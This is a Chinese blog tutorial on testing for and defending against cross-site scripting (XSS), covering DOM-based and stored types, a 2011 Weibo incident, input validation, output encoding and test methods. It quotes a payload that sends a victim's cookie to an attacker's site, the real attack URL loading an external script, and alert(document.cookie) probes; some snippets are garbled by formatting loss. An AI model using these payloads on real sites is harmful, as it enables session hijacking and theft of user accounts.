# web安全测试之 xss攻击 - zhusongziye的博客 - CSDN博客





2018年11月03日 19:47:28[zhusongziye](https://me.csdn.net/zhusongziye)阅读数：47








**一、 背景知识**

1、 什么是 XSS 攻击？

XSS 攻击： 跨站脚本攻击（Cross Site Scripting） ， 为不和层叠样式表(Cascading Style Sheets,CSS)的缩写混淆。 故将跨站脚本攻击缩写为 XSS。 跨站脚本攻击， 是 Web 程序中常见的漏洞，XSS 属于被动式且用于客户端的攻击方式， 所以容易被忽略其危害性。 其原理是攻击者在网页中嵌入恶意代码(例如 JavaScript)， 当其它用户浏览该网站时， 这段代码会自动执行， 从而达到攻击的目的。 比如这些代码包括HTML 代码和客户端脚本。 对于跨站脚本攻击， 黑客界共识是： 跨站脚本攻击是新型的"缓冲区溢出攻击"， 而 JavaScript 是新型的"ShellCode"。XSS 并不限于可见的页面输入， 还有可能是隐藏表单域、 get 请求参数等。

2、 XSS 攻击的危害：

盗取用户 Cookie、 破坏页面结构、 导航到恶意网站、 获取浏览器信息、 携带木马等。

**二、 XSS 漏洞的分类**

XSS 漏洞按照攻击利用手法的不同， 有以下三种类型：

XSS 攻击类似于 SQL 注 入攻击， 攻击之前， 我们先找到一个存在 XSS 漏洞的网站，

XSS 漏洞分为两种， 一种是 DOM Based XSS 漏洞， 另一种是 Stored XSS 漏洞。 理论上， 所有可输入的地方没有对输入数据进行处理的话， 都会存在XSS 漏洞， 漏洞的危害取决于攻击代码的威力， 攻击代码也不局限于script。



1、 DOM Based XSS

DOM Based XSS 是一种基于网页 DOM 结构的攻击， 该攻击特点是中招的人是少数人。

场景一：

当我登录

a.com 后，我发现它的页面某些内容是根据 url 中的一个叫 content 参数直接显示的，猜测它测页面处理可能是这样， 其它语言类似：<%@ page="" language="java" contenttype="text/html; charset=UTF-8" pageencoding="UTF-8">Transitional//EN""http://www.w3.org/TR/html4/loose.dtd">

XSS

测试

页面内容： <%=request.getparameter("content")%>

我知道了 Tom 也注册了该网站， 并且知道了他的邮箱(或者其它能接收信息的联系方式)， 我

做 一 个 超 链 接 发 给 他 ， 超 链 接 地 址 为 ：http://www.a.com?content=

window.open(“www.b.com?param=”+document.cookie)， 当 Tom 点击这个链 接的时

候(假设他已经登录 a.com)， 浏览器就会直接打开 b.com， 并且把 Tom 在 a.com 中的 cookie信息发送到 b.com， b.com 是我 搭建的网站， 当我的网站接收到该信息时， 我就盗取了 Tom在 a.com 的 cookie 信息， cookie 信息中可能存有登录密码， 攻击成功！ 这个过程中， 受害者只有Tom 自己。 那当我在浏览器输入 a.com?content=器展示页面内容的过程中， 就会执行我的脚本， 页面输出xss 字样， 这是攻击了我自己， 那我如何攻击别人并且获利呢？

2、 Stored XSS

Stored XSS 是存储式 XSS 漏洞， 由于其攻击代码已经存储到服务器上或者数据库中， ， 比如发布一篇文章包含恶意代码， 其他用户浏览时将执行恶意脚本， 所以受害者是很多人。

场景二：

a.com 可以发文章， 我登录后在 a.com 中发布了一篇文章， 文章中包含了恶意代 码，和 Jack 看到了我发布的文章， 当在查看我的文章时就都中招了， 他们的 cookie 信息都发送到了我的服务 器上， 攻击成功！ 这个过程中， 受害者是多个人。Stored XSS 漏洞危害性更大， 危害面更广。

3、 攻击事例

2011 年新浪微博的 XSS 攻击就是存储式 XSS 漏洞攻击， 主要是通过未过滤处理的 URL 中的参数来加载攻击者已写好的脚本， 并且使用短链服务将URL 伪装， 然后通过诱人的话题欺骗用户访问该链接后在浏览器运行， 达到攻击的目的。 如将http://163.fm/PxZHoxn 指向http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update。 所以我们应该严防短链接。

**三、 XSS 防御**

我们是在一个矛盾的世界中， 有矛就有盾。 只要我们的代码中不存在漏洞， 攻击者就无从下手， 我们要做一个没有缝的蛋。

XSS 漏洞修复

原则： 不相信客户输入的数据

注意: 攻击代码不一定在中将重要的cookie 标记为 http only, 这样的话 Javascript 中的 document.cookie 语句就不能获取到cookie 了.需要对用户的输入进行处理， 只允许用户输入我们期望的数据， 其它值一概过滤掉。 例如： 年龄的textbox 中， 只允许用户输入数字。 而数字之外的字符都过滤掉。

对数据进行Html Encode 处理过滤或移除特殊的Html标签， 例如:过滤 JavaScript 事件的标签。 例如 "onclick=", "onfocus" 等等。XSS 具体的防御有如下方式：

1. 输入校验

对 用户的所有输入数据进行检测， 比如过滤其中的“<”、>”、 “/”、 双引号等可能导致脚本注入的特殊字符， 或者过滤“script”、 “javascript”等脚本关键字， 或者对输入数据的长度及格式进行限制等等。 同时， 我们也要考虑用户可能绕开ASCII 码， 使用十六进制编码

如“<”（“<”）>”（“>”） 等来输入脚本。 因此， 对用户输入的十六进制编码， 我们也要进行相应的过滤。 只要开发人员能够严格检测每一处交互点， 保证对所有用户可能的输入都进行检测和XSS 过滤， 就能够有效地阻止 XSS 攻击。

2. 输出编码

通过前面对 XSS 攻击的分析， 我们可以看到， 之所以会产生 XSS 攻击， 就是因为 Web应用程序将用户的输入直接嵌入到某个页面当中， 作为该页面的 HTML 代 码的一部分。因此， 当Web 应用程序将用户的输入数据输出到目标页面中时， 只要先对这些数据进行编码， 然后再输出到目标页面中。 这样， 如果用户输入一些HTML 的脚本， 也会被当成普通的文字， 而不会成为目标页面HTML 代码的一部分得到执行。

3. 严防外部的 Javascript

外部的 Javascript 一旦引入了， 这些脚本就能够操纵你的 HTML 页面， 窃取敏感信息或者发起钓鱼攻击等等。

**四、 如何测试 XSS 漏洞**

方法一： 查看代码， 查找关键的变量, 客户端将数据传送给 Web 服务端一般通过三种方式Querystring, Form 表单， 以及 cookie. 例如在 ASP 的程序中， 通过 Request 对象获取客户端的变量

<%strUserCode = Request.QueryString(“code”);

strUser = Request.Form(“USER”);

strID = Request.Cookies(“ID”);%>

假如变量没有经过 htmlEncode 处理， 那么这个变量就存在一个 XSS 漏洞

方法二： 准备测试脚本

"/>alert(document.cookie)alert(document.cookie)

ck="alert(document.cookie)

在网页中的 Textbox 或者其他能输入数据的地方， 输入这些测试脚本， 看能不能弹出对话框， 能弹出的话说明存在XSS 漏洞在URL 中查看有那些变量通过 URL 把值传给 Web 服务器， 把这些变量的值退换成我们的测试的脚本。 然后看我们的脚本是否能执行

方法三

: 自动化测试 XSS 漏洞

现在已经有很多

XSS 扫描工具了。 实现 XSS 自动化测试非常简单， 只需要用HttpWebRequest 类。 把包含 xss 测试脚本。发送给 Web 服务器。 然后查看 HttpWebResponse中， 我们的 XSS 测试脚本是否已经注入进去了。

五、 HTML Encode

XSS 之所以会发生， 是因为用户输入的数据变成了代码。 所以我们需要对用户输入的数据进行HTML Encode 处理。 将其中的"中括号"， “单引号”， “引号” 之类的特殊字符进行编码。在C#中已经提供了现成的方法， 只要调用 HttpUtility.HtmlEncode("string ") 就可以了。 （需要引用 System.Web 程序集）Fiddler 中也提供了很方便的工具, 点击 Toolbar 上的"TextWizard" 按钮



